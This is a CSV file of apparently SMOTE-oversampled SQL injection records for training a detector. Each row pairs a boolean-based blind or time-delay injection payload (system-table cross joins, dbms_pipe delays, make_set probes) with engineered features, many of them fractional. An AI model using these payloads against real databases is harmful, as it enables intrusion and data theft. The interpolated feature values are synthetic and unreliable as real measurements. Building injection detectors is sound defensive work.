id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000403,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000046,0.48217588150690927,146.69659391268118,33.17602828155625,4.168063898863484,72.11233937867496,16.0,42.40822625244997,16.176028281556246,0.4913569400163243,0.10936613070941076,0.2888374553846332,0.11043947388963178,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.176028281556246,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.8239717184437534,0.17602828155624656,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000404,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000024,0.47241322730700835,156.60374080580152,32.3962591941985,4.096814115158296,82.07539521353684,16.132086398066164,43.0,15.396259194198496,0.5240188006304806,0.10303075984794292,0.27459008790431527,0.09836035161726121,0.1320863980661655,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.1320863980661655,5.0,0.13208639806616562,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.8679136019338344,0.13208639806616557,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000405,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000021,1.6237632675664262,134.76182937201298,36.73015244766775,3.9099829984393484,43.0,22.460304895335497,52.11106713367425,17.19045734300325,0.3196021012769405,0.16666666666666666,0.38636924766266073,0.12736198439373214,1.7301524476677497,0.7301524476677496,2.0,0.7301524476677497,0.26984755233225044,2.0,0.0,8.460304895335499,0.0,0.26984755233225044,1.0,5.0,1.0,0.7301524476677496,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.26984755233225044,0.0,1.0,0.26984755233225044,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.539695104664501
SMOTE_000406,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000025,1.3191058626413115,130.1177386248587,31.915053027746378,4.1452182756861085,71.54247348612681,8.457526513873187,33.74515908323913,16.372579541619565,0.5506099046597385,0.06494452861547044,0.25886185462184075,0.1255837121029503,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.457526513873188,1.0,0.0,2.457526513873188,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.5424734861268118,0.4575265138731882,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000407,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000051,4.067997851026043,162.07143011736204,34.0,3.8743475619134227,59.57653072266872,13.459184336012305,61.30612289067487,27.729592168006153,0.3681420591514619,0.08240569289472303,0.37843725062768896,0.1710149973261261,0.0,3.0,0.0,0.0,0.0,1.0,0.0,13.153061445337435,0.5765307226687175,2.0,2.7295921680061523,5.8469385546625645,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.4234692773312825,0.0,0.0,0.4234692773312824,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.7295921680061526,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5765307226687173
SMOTE_000408,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000025,0.8475024370219173,126.43988660775901,31.219943303879504,4.131185279727188,73.75954643103603,7.120226784481988,30.560113392240993,15.0,0.5832112484221162,0.056400637523726344,0.2417496157354809,0.11863849831867651,0.0,1.439886607759006,1.5601133922409938,0.0,1.0,1.0,0.0,3.780056696120497,0.7800566961204969,0.0,2.219943303879503,3.5601133922409938,0.0,1.0,0.7800566961204969,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000409,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000015,0.5447184750042691,149.94143549001276,31.117129019974467,4.191589519317971,85.05856450998724,9.0,39.8243064700383,16.05856450998723,0.5672824456307382,0.06002358302415593,0.2655923288995631,0.10710164244554277,1.1756935299616988,0.0,0.0,0.0,1.0,1.0,0.0,4.941435490012767,0.0,0.0,3.0,2.0,1.0,0.0,0.0,0.9414354900127672,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.05856450998723295,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.058564509987233
SMOTE_000410,attack,boolean,"-4889""   )    )    as vvuo where 8060  =  8060 or   (  8459  =  8459  )  *4906--",nearest_attack_euclidean,R000027,0.23048653790880444,80.07360374631462,22.44162247788771,3.488809533904455,13.515226224202326,24.0,31.55837752211229,11.0,0.16871315574600249,0.29972739353216804,0.3941843953529191,0.13737505536891037,0.0,1.0,3.0,0.0,0.9263962536853818,2.0,0.0,3.926396253685382,0.0,0.07360374631461819,0.07360374631461819,5.926396253685382,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000411,attack,boolean,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,nearest_attack_euclidean,R000001,0.5480256743252288,75.97842584828348,23.918098272680805,3.3799956734372887,27.02010919186756,6.632174706988096,32.02010919186756,10.306032757560267,0.35735845717706377,0.08165971592363933,0.42431389646117074,0.1366679304381262,0.0,0.0,2.0,0.0,1.0,2.897989080813244,0.0,2.408043676747024,0.0,0.10201091918675598,0.1020109191867562,6.795978161626488,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.897989080813244,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.897989080813244
SMOTE_000412,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000023,0.06652269979486404,122.8023978846059,27.0,3.4963228235220773,41.90119894230295,13.0,53.90119894230295,14.0,0.3411706373945608,0.10588624173695946,0.43891178361329264,0.11403133725518709,0.04940052884852486,3.9505994711514747,0.0,0.0,0.0,2.0,0.0,7.975299735575737,0.024700264424262652,0.0,0.0,2.0,0.012350132212131326,0.9876498677878687,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000413,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",nearest_attack_euclidean,R000020,1.4243406162642922,122.66537702870411,29.0,4.101896127916011,69.64603483926498,8.520309417911049,27.95744670723408,16.54158606429401,0.5765685053255356,0.06536820406743203,0.2223330106941357,0.1357302799128966,2.1876209035589893,0.0,0.0,0.0,1.0,1.2707930321470038,0.0,3.0831721285880147,0.0,5.0,4.0,2.2707930321470036,0.7292069678529964,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.2707930321470036,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2707930321470036
SMOTE_000414,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000071,0.11157728087385413,138.35112786711093,30.0,4.0294712172946765,74.8439431701729,8.156056829827087,37.39014207456771,17.96098579254323,0.5412546250209281,0.05884089648733046,0.27001337212965626,0.12989110636208512,3.9219715850864576,0.0,0.0,0.0,1.0,2.0,0.0,4.078028414913542,1.9609857925432288,0.0,2.0,3.0,0.9804928962716144,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.9804928962716146,0.0195071037283856,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000415,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000045,0.025660654025660676,73.0,26.0,3.784192704600026,13.999999999999996,24.0,24.0,11.0,0.1917808219178082,0.3287671232876712,0.3287671232876712,0.1506849315068493,0.0,1.0,3.0,0.0,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000416,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000059,0.10222061414450599,127.94694353994186,31.973471769970928,4.354912603602521,79.78777415976742,4.106112920116287,29.053056460058144,15.0,0.6235788448198711,0.03210532487692941,0.22707898463722276,0.1172368456659767,0.0,2.9469435399418566,0.053056460058143684,0.0,1.0,1.0,0.0,3.0265282300290717,0.026528230029071787,0.0,2.9734717699709283,2.0530564600581434,0.0,1.0,0.026528230029071787,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000417,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000059,1.6227246899209005,127.15774300108872,31.57887150054436,4.237753310686598,76.63097200435486,5.684513997822572,29.84225699891128,15.0,0.6024395446720192,0.04482805181776625,0.23476155436688195,0.11797084914333267,0.0,2.157743001088715,0.8422569989112851,0.0,1.0,1.0,0.0,3.421128499455642,0.42112849945564257,0.0,2.5788715005443574,2.842256998911285,0.0,1.0,0.42112849945564257,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000418,attack,boolean,"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",nearest_attack_euclidean,R000005,0.5470574473536807,73.20549822148405,25.397250889257972,3.7889606298431,13.849312722314494,24.0,25.205498221484053,10.150687277685506,0.18963082307393517,0.3283104240771497,0.34337915184570045,0.13867960100321458,0.0,0.15068727768550683,3.0,0.0,0.15068727768550694,2.0,0.0,3.150687277685507,0.0,0.8493127223144931,0.849312722314493,5.150687277685507,0.0,0.15068727768550694,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000419,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000023,0.9865898806746726,125.99950181408536,27.428500259155054,3.4624243321072927,42.0,13.0,56.57100155493032,14.428500259155053,0.3339873552791178,0.10337703853877457,0.4481787486378149,0.11445685754429269,0.8570005183101062,3.142999481689894,0.0,0.0,0.0,2.0,0.0,8.428500259155053,0.0,0.0,0.0,2.0,0.21425012957752654,0.7857498704224735,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000420,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000076,1.3076151089208037,127.73146394967094,32.0,4.00814002591013,54.40461034463802,18.211422675054845,41.0,14.115430929978062,0.41636822222648184,0.1469623138449938,0.3255389417969134,0.11113052213161094,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.442284535010969,0.0,0.442284535010969,1.557715464989031,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000421,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",nearest_attack_euclidean,R000020,1.4510510207639273,119.67796882983326,28.33200366707844,4.061490566700891,71.0,5.0,26.675974330450927,17.00199449938234,0.5958125226383982,0.04195862835481677,0.2203124252989871,0.14191642370779795,1.9980055006176591,1.001994499382341,0.0,0.0,1.0,1.0,0.0,3.001994499382341,0.0,5.0,4.0,2.0,0.6660018335392197,0.3339981664607804,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000422,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000031,0.17320727364112648,74.66848376685613,22.96286201295244,3.605958839527537,20.702896103619498,13.0,28.74275974095125,12.222827922285374,0.2784923843366428,0.17439919374719015,0.38370250813137796,0.1634059137847891,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.148551948190249,0.07427597409512499,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000423,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000033,0.6475478218147408,164.89640653634643,35.522524082514835,3.9409100534535506,49.80631020628709,24.0,61.68694122691579,29.40315510314354,0.3018001082034944,0.14597947028536576,0.37394921673088655,0.1782712047802533,3.5225240825148334,0.11936897937129165,0.2387379587425834,0.0,0.0,2.0,0.0,11.761262041257417,0.0,2.0,1.0,10.0,0.8806310206287083,0.1193689793712917,0.11936897937129154,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.8806310206287082,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8806310206287082
SMOTE_000424,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R000077,2.6952150694693655,169.47091592440606,35.264542037796964,3.9039564148474786,53.941831848812136,25.470915924406068,65.94183184881213,24.11633630237573,0.3182496862204387,0.1502735256692743,0.38906022574799914,0.14241656236228784,4.0,0.0,0.7354579622030337,0.0,0.0,2.0,0.0,10.529084075593932,0.0,0.5290840755939326,0.2645420377969663,7.793626113390898,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.2645420377969663,0.7354579622030337,0.7354579622030337,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7354579622030337,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7354579622030337,0.7354579622030337,5.941831848812135
SMOTE_000425,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000057,1.967552716273444,142.61658826920748,33.288536766825466,3.8394632283651653,54.375488984365546,11.067194849761798,54.73122060095281,22.442683834127344,0.380958409394776,0.07974143730951894,0.38387424231762246,0.15542591097808262,0.0,3.355731616587266,0.0,0.0,0.3557316165872657,1.0,0.0,10.577073533650937,0.0,1.6442683834127343,1.0,5.221341917063672,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6442683834127343,1.0,0.0,0.0,1.0,1.0,0.3557316165872657,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3557316165872657
SMOTE_000426,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000057,0.4372692333321688,151.84096545927366,33.84578324709098,3.8537238295347973,57.30361571800073,10.385541882272562,58.306024611909386,25.845783247090974,0.3762182982104188,0.06910759612849093,0.38417392435255104,0.17050018130853922,0.0,2.768674870636463,0.15421675290902492,0.0,0.0,1.0,0.0,11.922891623545487,0.0,2.0,1.0,7.154216752909026,0.0,0.9228916235454876,0.0771083764545124,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9228916235454876,0.0,0.0,0.9228916235454876,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.845783247090975
SMOTE_000427,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000025,2.139238807223696,130.64993323241407,30.61250556396549,4.05333214741427,73.16248330810352,8.0,33.32496661620704,16.16248330810352,0.56059798160152,0.06135268772375704,0.2545892491049719,0.1234600815697511,1.549977744138027,0.6125055639654933,1.2250111279309868,0.0,1.0,1.3874944360345067,0.0,4.0,1.3874944360345067,0.0,2.0,3.6125055639654935,0.3874944360345067,0.6125055639654933,0.6125055639654933,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.3874944360345067,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3874944360345065
SMOTE_000428,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000011,0.9099058964490561,132.15962550019097,32.36880566670911,4.184558849523778,71.31559716664545,8.684402833354554,35.10641700012732,17.05320850006366,0.540286431921433,0.06566477089953826,0.2652239947977732,0.12882480238125552,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.684402833354554,1.0,0.0,2.6844028333545533,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.3155971666454467,0.6844028333545533,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000429,attack,boolean,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,nearest_attack_euclidean,R000018,0.5691348486858627,62.81763436504847,26.091182817475765,3.8262353763542607,11.204784965291296,16.0,22.272042956310585,13.340806443446589,0.1817501108158798,0.256103438398813,0.3496363493791731,0.21251010140613408,0.0,4.0,1.0,0.0,0.11360214781552935,2.0,0.0,2.4544085912621165,2.0,0.8863978521844709,0.8863978521844708,3.113602147815529,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000430,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000017,0.317192540598496,161.5682483100154,33.88420230047692,4.081915516127199,80.61042760572309,16.0,48.073618403815395,16.884202300476925,0.49878533881619147,0.0992200250315433,0.29738313367878944,0.10461150247347575,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.884202300476924,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.11579769952307561,0.8842023004769244,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000431,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000071,1.7501333501700067,127.82883993898841,29.246580736221365,4.097376578865065,74.24658073622136,6.116451840553408,31.72606515354954,15.73974220866409,0.5864907394029519,0.046314116365352084,0.2451710349554293,0.12202410927626668,3.623290368110682,0.0,0.0,0.0,1.0,1.6232903681106816,0.0,3.2465807362213632,1.2465807362213632,0.0,2.0,2.6232903681106814,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.6232903681106818,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6232903681106814
